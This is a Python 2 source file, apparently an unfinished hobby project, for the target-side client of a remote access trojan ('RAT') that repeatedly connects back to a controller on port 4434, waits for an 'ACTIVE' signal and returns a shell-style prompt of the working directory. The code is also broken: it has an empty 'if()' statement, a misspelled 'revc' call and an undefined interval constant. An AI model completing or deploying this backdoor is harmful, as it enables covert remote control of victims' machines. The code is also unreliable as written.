1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
#!/usr/bin/python

############################
## Runs on Traget Machine ##
############################

import os
import sys
import time
import socket
import subprocess



class RAT:

	_sock = None
	_port = None
	_loop = None

	BUFFER = 1024
	SHORT_INTERVAL = 0.1
	MID_INTERVAL = 0.8
	LONG_INTERAL = 10

	SIG = "ACTIVE"
	PASS = "DONE"
	FAIL = "FILE_NONE"
	FLAG = False


	# constructor
	def __init__(self):
		self.start()


	# initializer
	def init(cls):
		# set new socket 
		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# set loopback address
		cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
		# set new port
		cls._port = 4434	


	# send data
	def send(cls, cmd):
		cls._sock.sendall(cmd)

	# receive data
	def receive(cls):
		data = ''
		pkt = cls._sock.recv(cls.BUFFER)
		while(pkt):
			data += pkt
			if(data):
				break
			else:
				pkt = cls._sock.revc(cls.BUFFER)
		return data

	# bind connection
	def connect(cls, addr, port):
		cls._sock.connect((addr, port))
		

	# stop socket connection
	def stop(cls):
		cls._sock.close()

	# kill socket connection
	def kill(cls):
		cls._sock.close()
		del(cls._sock)
		sys.exit()



	


	# start the service
	def start(cls):
		while True:			
			try:
				cls.init()
				cls.connect(cls._loop, cls._port)
			
				data = cls.receive()
				if(data == cls.SIG):
					cls.FLAG = True
					cls.send("\n" + os.getcwd() + "> ")

				if()

			except socket.error as e:
				# Connection refused
				if(e[0] is 61):
					cls.stop()
					time.sleep(cls.LONG_INTERVAL)
					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
					continue
				# Socket is not connected
				if(e[0] is 57):
					cls.stop()
					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
					time.sleep(cls.LONG_INTERVAL)		
					continue
				# Bad file descriptor
				elif(e[0] is 9):
					cls.stop()
					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
					time.sleep(cls.LONG_INTERVAL)
					continue
				# Broken Pipe
				elif(e[0] is 32):
					cls.stop()
					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
					time.sleep(cls.LONG_INTERVAL)
					continue
				else:
					cls.stop()
					print "CODE: {}\nMSG: {}".format(str(e[0]), str(e[1]))
					time.sleep(cls.LONG_INTERVAL)
					continue


	
def main():
	rat = RAT()


if __name__ == '__main__':
	main()


